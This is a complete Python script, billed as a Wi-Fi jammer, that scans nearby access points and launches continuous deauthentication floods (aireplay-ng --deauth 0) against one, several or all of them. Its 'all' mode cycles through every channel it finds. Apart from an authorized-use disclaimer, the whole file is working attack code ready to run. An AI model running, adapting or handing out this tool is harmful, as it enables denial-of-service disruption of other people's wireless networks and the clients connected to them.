#!/usr/bin/env python3
"""
===============================================================================
Advanced Wi-Fi Jammer Framework - Targeted Attack Mode
===============================================================================

⚠️ DISCLAIMER ⚠️
Authorized security testing and educational use ONLY.
Do NOT use against networks you do not own or have permission to test.
===============================================================================
"""

import subprocess
import time
import os
import signal
import sys
import argparse
import threading
from collections import defaultdict
from dataclasses import dataclass
from typing import List, Dict
import concurrent.futures

# ─── DEFAULT CONFIG ─────────────────────────────────────────────────────────
DEFAULT_BASE_IFACE = "wlan0"
DEFAULT_CYCLE_TIME = 120
# ────────────────────────────────────────────────────────────────────────────

@dataclass
class APInfo:
    """Wi-Fi AP information structure"""
    index: int = 0
    bssid: str = ""
    essid: str = ""
    channel: int = 0
    signal: int = 0
    encryption: str = ""
    clients: List[str] = None
    
    def __post_init__(self):
        if self.clients is None:
            self.clients = []

class TargetedDeauthEngine:
    """Deauthentication engine for targeted attacks"""
    
    def __init__(self, mon_iface: str):
        self.mon_iface = mon_iface
        self.active_processes = []
        self.running = True
        self.lock = threading.Lock()
    
    def cleanup(self):
        """Terminate all running processes"""
        with self.lock:
            self.running = False
            for proc in self.active_processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except:
                    pass
            self.active_processes.clear()
    
    def set_channel(self, channel: int):
        """Set interface channel"""
        subprocess.run(
            ["iwconfig", self.mon_iface, "channel", str(channel)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(0.5)
    
    def attack_ap(self, ap: APInfo, duration: int):
        """Attack a single AP for specified duration"""
        if not self.running:
            return
        
        print(f"\n[⚡] Attacking: {ap.essid} ({ap.bssid})")
        print(f"    Channel: {ap.channel}, Signal: {ap.signal}dBm, Duration: {duration}s")
        
        self.set_channel(ap.channel)
        
        # Prepare deauth command
        cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, self.mon_iface]
        
        # Start deauth process
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        with self.lock:
            self.active_processes.append(proc)
        
        # Run for specified duration
        for i in range(duration):
            if not self.running:
                break
            if i % 5 == 0:  # Update every 5 seconds
                remaining = duration - i
                print(f"    Time remaining: {remaining}s")
            time.sleep(1)
        
        # Terminate process
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except:
            pass
        
        with self.lock:
            if proc in self.active_processes:
                self.active_processes.remove(proc)
        
        print(f"[✓] Finished attacking: {ap.essid}")
    
    def attack_multiple_aps(self, aps: List[APInfo], duration_per_ap: int):
        """Attack multiple APs sequentially"""
        if not self.running:
            return
        
        print(f"\n[⚡] Attacking {len(aps)} APs, {duration_per_ap}s each")
        
        for i, ap in enumerate(aps, 1):
            if not self.running:
                break
            
            print(f"\n--- AP {i}/{len(aps)} ---")
            self.attack_ap(ap, duration_per_ap)
            
            # Short pause between attacks
            if i < len(aps) and self.running:
                print("\n[↻] Switching to next AP in 2 seconds...")
                time.sleep(2)
    
    def attack_all_aps(self, channel_map: Dict[int, List[APInfo]], cycle_time: int):
        """Attack all APs using channel-based scheduling"""
        if not self.running:
            return
        
        # Group APs by channel and calculate scores
        scores = {}
        for ch, aps in channel_map.items():
            avg_sig = sum(ap.signal for ap in aps) / len(aps)
            scores[ch] = len(aps) * (abs(avg_sig) / 100)
        
        if not scores:
            print("[!] No APs to attack")
            return
        
        total = sum(scores.values())
        sorted_chs = sorted(scores.items(), key=lambda x: x[1], reverse=True)
        
        print(f"\n[⚡] Attacking all APs on {len(channel_map)} channels")
        
        for ch, score in sorted_chs:
            if not self.running:
                break
            
            duration = (score / total) * cycle_time
            aps_on_channel = channel_map[ch]
            
            print(f"\n--- Channel {ch} ---")
            print(f"    APs: {len(aps_on_channel)}, Duration: {duration:.1f}s")
            essids = sorted(set(ap.essid if ap.essid else "<hidden>" for ap in aps_on_channel))
            print("    Wi-Fi:")
            for essid in essids:
                print(f"     {essid}")


            self.set_channel(ch)
            
            # Start deauth for all APs on this channel
            procs = []
            for ap in aps_on_channel:
                cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, self.mon_iface]
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                procs.append(proc)
                with self.lock:
                    self.active_processes.append(proc)
            
            # Run for calculated duration
            time.sleep(duration)
            
            # Terminate all processes on this channel
            for proc in procs:
                proc.terminate()
                try:
                    proc.wait(timeout=1)
                except:
                    pass
                
                with self.lock:
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)

def run_cmd(cmd):
    """Run system command"""
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def kill_conflicts():
    """Kill conflicting processes"""
    print("[*] Killing conflicting processes...")
    run_cmd(["airmon-ng", "check", "kill"])

def start_monitor_mode(base_iface):
    """Enable monitor mode"""
    print(f"[*] Enabling monitor mode on {base_iface}...")
    run_cmd(["airmon-ng", "start", base_iface])

def stop_monitor_mode(mon_iface, base_iface):
    """Disable monitor mode"""
    print(f"\n[*] Disabling monitor mode on {mon_iface}...")
    run_cmd(["airmon-ng", "stop", mon_iface])
    run_cmd(["service", "NetworkManager", "restart"])
    run_cmd(["ifconfig", base_iface, "up"])

def run_airodump(mon_iface, output_file):
    """Scan for Wi-Fi networks"""
    if os.path.exists(output_file):
        os.remove(output_file)
    
    print("[*] Scanning for Wi-Fi networks (15 seconds)...")
    
    p = subprocess.Popen(
        [
            "airodump-ng",
            "--write-interval", "1",
            "--output-format", "csv",
            "-w", output_file.replace("-01.csv", ""),
            mon_iface
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    time.sleep(15)
    p.terminate()
    time.sleep(2)

def parse_airodump_output(output_file):
    """Parse airodump-ng output and return list of APs"""
    ap_list = []
    
    try:
        with open(output_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            
            bssid_section = True
            client_map = defaultdict(list)
            
            for line in lines:
                line = line.strip()
                
                # Detect section transition
                if "Station MAC" in line:
                    bssid_section = False
                    continue
                
                if not line or line.startswith("#"):
                    continue
                
                fields = line.split(",")
                
                if bssid_section and len(fields) > 13:
                    bssid = fields[0].strip()
                    ch_str = fields[3].strip()
                    sig_str = fields[8].strip()
                    essid = fields[13].strip()
                    
                    # Validate BSSID and channel
                    if len(bssid.split(":")) == 6 and ch_str.isdigit():
                        channel = int(ch_str)
                        signal = int(sig_str) if sig_str.lstrip("-").isdigit() else -100
                        
                        # Only add if ESSID is not empty
                        if essid:
                            ap_list.append(APInfo(
                                bssid=bssid,
                                essid=essid if essid else "<hidden>",
                                channel=channel,
                                signal=signal
                            ))
                
                elif not bssid_section and len(fields) > 5:
                    # Client information
                    client_mac = fields[0].strip()
                    bssid = fields[5].strip()
                    
                    if (len(client_mac.split(":")) == 6 and 
                        len(bssid.split(":")) == 6):
                        client_map[bssid].append(client_mac)
            
            # Associate clients with APs
            for ap in ap_list:
                ap.clients = client_map.get(ap.bssid, [])
            
    except FileNotFoundError:
        print(f"[!] Output file not found: {output_file}")
    
    # Add indices
    for i, ap in enumerate(ap_list, 1):
        ap.index = i
    
    return ap_list

def display_ap_list(ap_list):
    """Display available Wi-Fi networks"""
    print("\n" + "="*80)
    print("AVAILABLE WI-FI NETWORKS")
    print("="*80)
    print(f"{'No.':<5} {'ESSID':<25} {'BSSID':<18} {'Ch':<4} {'Signal':<8} {'Clients':<8}")
    print("-"*80)
    
    for ap in ap_list:
        essid_display = ap.essid[:22] + "..." if len(ap.essid) > 25 else ap.essid
        print(f"{ap.index:<5} {essid_display:<25} {ap.bssid:<18} "
              f"{ap.channel:<4} {ap.signal:<8} {len(ap.clients):<8}")
    
    print("="*80)
    print(f"Total networks found: {len(ap_list)}")
    print("="*80)

def get_user_selection(ap_list):
    """Get user input for attack selection"""
    print("\n" + "="*80)
    print("ATTACK SELECTION")
    print("="*80)
    print("Options:")
    print("  s - Attack single WI-FI")
    print("  m - Attack multiple Wi-Fi's")
    print("  a - Attack all Wi-Fi's")
    print("  q - Quit")
    print("-"*80)
    
    while True:
        choice = input("\nChoose option (s/m/a/q): ").strip().lower()
        
        if choice == 'q':
            print("[*] Exiting...")
            return None
        
        if choice == 's':
            return get_single_selection(ap_list)
        elif choice == 'm':
            return get_multiple_selection(ap_list)
        elif choice == 'a':
            return {'mode': 'all', 'targets': ap_list}
        else:
            print("[!] Invalid option. Please choose s, m, a, or q.")

def get_single_selection(ap_list):
    """Get single AP selection from user"""
    while True:
        try:
            choice = input(f"Select AP number (1-{len(ap_list)}): ").strip()
            
            if choice.lower() == 'q':
                return None
            
            index = int(choice)
            if 1 <= index <= len(ap_list):
                selected_ap = ap_list[index - 1]
                print(f"\n[✓] Selected: {selected_ap.essid} ({selected_ap.bssid})")
                
                duration = input("Enter attack duration in seconds (default: 30): ").strip()
                duration = int(duration) if duration.isdigit() else 30
                
                return {
                    'mode': 'single',
                    'targets': [selected_ap],
                    'duration': duration
                }
            else:
                print(f"[!] Please enter a number between 1 and {len(ap_list)}")
        except ValueError:
            print("[!] Please enter a valid number")

def get_multiple_selection(ap_list):
    """Get multiple AP selection from user"""
    while True:
        try:
            choice = input(f"Select AP numbers (e.g., 1,3,5 or 1-5): ").strip()
            
            if choice.lower() == 'q':
                return None
            
            selected_indices = set()
            
            # Parse different input formats
            if ',' in choice:
                # Comma-separated list
                parts = choice.split(',')
                for part in parts:
                    part = part.strip()
                    if '-' in part:
                        # Range
                        start, end = map(int, part.split('-'))
                        selected_indices.update(range(start, end + 1))
                    elif part.isdigit():
                        selected_indices.add(int(part))
            elif '-' in choice:
                # Single range
                start, end = map(int, choice.split('-'))
                selected_indices.update(range(start, end + 1))
            elif choice.isdigit():
                selected_indices.add(int(choice))
            else:
                print("[!] Invalid format. Use: 1,3,5 or 1-5 or 1")
                continue
            
            # Validate indices
            valid_indices = [idx for idx in selected_indices if 1 <= idx <= len(ap_list)]
            
            if not valid_indices:
                print(f"[!] No valid selections. Please choose between 1 and {len(ap_list)}")
                continue
            
            selected_aps = [ap_list[idx - 1] for idx in valid_indices]
            
            print(f"\n[✓] Selected {len(selected_aps)} APs:")
            for ap in selected_aps:
                print(f"  - {ap.essid} ({ap.bssid})")
            
            duration = input("\nEnter attack duration per AP in seconds (default: 15): ").strip()
            duration = int(duration) if duration.isdigit() else 15
            
            return {
                'mode': 'multiple',
                'targets': selected_aps,
                'duration': duration
            }
        except ValueError:
            print("[!] Please enter valid numbers")

def main():
    parser = argparse.ArgumentParser(
        description="Targeted Wi-Fi Deauthentication Tool",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument("--iface", default=DEFAULT_BASE_IFACE,
                       help="Base wireless interface")
    parser.add_argument("--time", type=int, default=DEFAULT_CYCLE_TIME,
                       help="Cycle time for 'all' mode (seconds)")
    
    args = parser.parse_args()
    
    # Print disclaimer
    print("="*80)
    print("⚠️  AUTHORIZED USE ONLY ⚠️")
    print("This tool is for authorized security testing and educational purposes only.")
    print("Use only on networks you own or have explicit permission to test.")
    print("="*80)
    
    base_iface = args.iface
    mon_iface = base_iface + "mon"
    output_csv = "/tmp/airodump_output-01.csv"
    
    def cleanup(sig=None, frame=None):
        """Cleanup handler"""
        print("\n[*] Cleaning up...")
        stop_monitor_mode(mon_iface, base_iface)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, cleanup)
    
    # Setup monitor mode
    kill_conflicts()
    start_monitor_mode(base_iface)
    time.sleep(2)
    
    try:
        # Scan for networks
        run_airodump(mon_iface, output_csv)
        ap_list = parse_airodump_output(output_csv)
        
        if not ap_list:
            print("[!] No Wi-Fi networks found. Exiting...")
            cleanup()
            return
        
        # Display networks
        display_ap_list(ap_list)
        
        # Get user selection
        selection = get_user_selection(ap_list)
        
        if not selection:
            cleanup()
            return
        
        # Initialize deauth engine
        engine = TargetedDeauthEngine(mon_iface)
        
        try:
            # Execute based on selection
            if selection['mode'] == 'single':
                engine.attack_ap(selection['targets'][0], selection['duration'])
            elif selection['mode'] == 'multiple':
                engine.attack_multiple_aps(selection['targets'], selection['duration'])
            elif selection['mode'] == 'all':
                # Group by channel for 'all' mode
                channel_map = defaultdict(list)
                for ap in selection['targets']:
                    channel_map[ap.channel].append(ap)
                engine.attack_all_aps(channel_map, args.time)
        
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        finally:
            engine.cleanup()
        
        print("\n[*] Attack completed")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    
    finally:
        cleanup()

if __name__ == "__main__":
    main()
